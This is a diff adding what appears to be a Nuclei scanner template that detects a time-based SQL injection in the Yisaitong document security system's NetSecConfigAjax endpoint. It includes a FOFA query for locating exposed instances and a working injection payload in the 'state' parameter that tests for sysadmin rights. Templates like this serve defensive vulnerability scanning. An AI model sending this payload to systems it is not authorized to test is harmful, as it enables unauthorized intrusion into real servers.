@@ -1,0 +1,26 @@
+id: yisaitong-netsec-sqli
+
+info:
+  name: Yisaitong Electronic Document Security Management System SQL Injection
+  author: Co5mos
+  severity: critical
+  description: |
+    亿赛通电子文档安全管理系统的`NetSecConfigAjax`接口的`state`参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限。
+  metadata:
+    fofa-query: 'app="亿赛通-DLP"'
+  tags: yisaitong, sqli
+
+http:
+  - raw:
+    - |
+      @timeout: 10s
+      POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'--
+
+    matchers:
+    - type: dsl
+      dsl:
+        - 'duration>=5'
